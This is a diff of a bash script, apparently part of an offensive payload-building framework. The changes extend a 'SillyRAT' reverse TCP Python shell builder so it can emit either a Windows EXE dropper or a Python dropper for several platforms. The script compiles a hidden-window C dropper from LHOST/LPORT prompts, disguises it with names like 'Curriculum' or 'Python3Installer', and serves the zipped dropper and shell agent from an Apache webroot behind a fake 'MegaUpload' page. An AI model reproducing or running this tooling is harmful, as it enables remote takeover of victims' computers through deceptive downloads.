@@ -11993,7 +11993,7 @@ cat << !
     DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
     TARGET SYSTEMS     : Multi-Platform (Linux|Mac|Windows)
     LOLBin             : Powershell (DownloadFile)
-    DROPPER EXTENSION  : EXE
+    DROPPER EXTENSION  : EXE|NULL
     AGENT EXTENSION    : PY
     AGENT PERSISTENCE  : NOT AVAILABLE
 
@@ -13185,12 +13185,21 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER FILENAME ☠" --text "example: Curriculum\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
+if [ -z "$Drop" ]; then Drop="Python3Installer";fi
+SOSP=$(zenity --list --title "☠ Target Operative System sellection ☠" --text "\nCreate a standalone executable (Windows) or Pure Python dropper ?" --radiolist --column "Pick" --column "Option" TRUE "$Drop.exe (default)" FALSE "$Drop.py (multi-platforms)") > /dev/null 2>&1
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="666";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
-if [ -z "$Drop" ]; then Drop="Python3Installer";fi
+if [ -z "$SOSP" ]; then SOSP="default)";fi
+if [ "$SOSP" = "$Drop.exe (default)" ] || [ "$SOSP" = "(default)" ]; then
+   if [ -z "$Drop" ]; then Drop="Python3Installer";fi
+   dropextension="exe";targetos="(Windows)"
+else
+   if [ -z "$Drop" ]; then Drop="Python3Installer";fi
+   dropextension="py";targetos="(Linux|Mac|Windows)"
+fi
 
 
 ## Display final settings to user.
@@ -13200,27 +13209,30 @@ cat << !
     LPORT    : $lport
     LHOST    : $lhost
     LOLBin   : Powershell (DownloadFile)
-    DROPPER  : $IPATH/output/$Drop.exe
+    DROPPER  : $IPATH/output/$Drop.$dropextension
     AGENT    : $IPATH/output/$Drop.py
+    TARGETOS : $targetos
     UPLOADTO : $rpath => (remote)
 !
 echo "---"
 
 
 cd $IPATH/output
-## BUILD DROPPER (to download/execute our legit pdf and agent.ps1).
-echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
-cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
-sed -i "s|LhOsT|$lhost|g" dropper.c
-sed -i "s|LpOrT|$lport|g" dropper.c
-sed -i "s|FiLNaMe|$Drop|g" dropper.c
-sed -i "s|TempDir|$rpath|g" dropper.c
+if [ "$SOSP" = "$Drop.exe (default)" ]; then
+   ## BUILD DROPPER (to download/execute Client.ps1).
+   echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
+   cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
+   sed -i "s|LhOsT|$lhost|g" dropper.c
+   sed -i "s|LpOrT|$lport|g" dropper.c
+   sed -i "s|FiLNaMe|$Drop|g" dropper.c
+   sed -i "s|TempDir|$rpath|g" dropper.c
 
-## COMPILING C Program USING mingw32 OR mingw-W64
-echo "${BlueF}[☠]${white} Compiling dropper using mingw32."${Reset};sleep 2
-# special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
-$ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
-rm $IPATH/output/dropper.c > /dev/nul 2>&1
+   ## COMPILING C Program USING mingw32 OR mingw-W64
+   echo "${BlueF}[☠]${white} Compiling dropper using mingw32."${Reset};sleep 2
+   # special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
+   $ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
+   rm $IPATH/output/dropper.c > /dev/nul 2>&1
+fi
 
 ## Writting Client reverse tcp python shell to output
 echo "${BlueF}[☠]${white} Writting Client rev tcp shell to output."${Reset};sleep 2
@@ -13237,9 +13249,14 @@ mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 
 cd $IPATH/output
 echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
-zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
-cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
-mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
+if [ "$SOSP" = "$Drop.exe (default)" ]; then
+   zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
+   cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
+   mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
+else
+   zip $Drop.zip $Drop.py > /dev/nul 2>&1 # # rev tcp Client shell
+   mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # rev tcp Client shell ziped
+fi
 cd $IPATH
 
 
